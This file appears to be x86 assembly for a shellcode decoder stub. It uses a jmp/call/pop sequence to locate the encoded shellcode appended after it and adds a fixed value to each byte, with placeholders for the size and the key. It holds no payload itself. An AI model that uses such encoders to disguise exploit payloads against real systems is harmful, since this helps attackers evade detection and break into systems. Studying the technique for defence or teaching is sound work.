/*
 *  Coded by Rodrigo Rubira Branco <rodrigo@kernelhacking.com>
 *
 *  the %ecx register contains the size of assembly code (shellcode).
 *
 *  pushl    $0x01
 *             ^^
 *             size of assembly code (shellcode)
 *
 *  addb    $0x00,(%esi)
 *             ^^
 *             number to add
 */

    jmp     label3

label1:
    popl    %esi
    pushl   $0x00  /* <-- size of assembly code (shellcode) */
    popl    %ecx
    
label2:
    addb    $0x00,(%esi) /* <-- number to add */
    incl    %esi
    loop    label2
    jmp     label4

label3:
    call    label1

label4:

/* assembly code (shellcode) goes here */
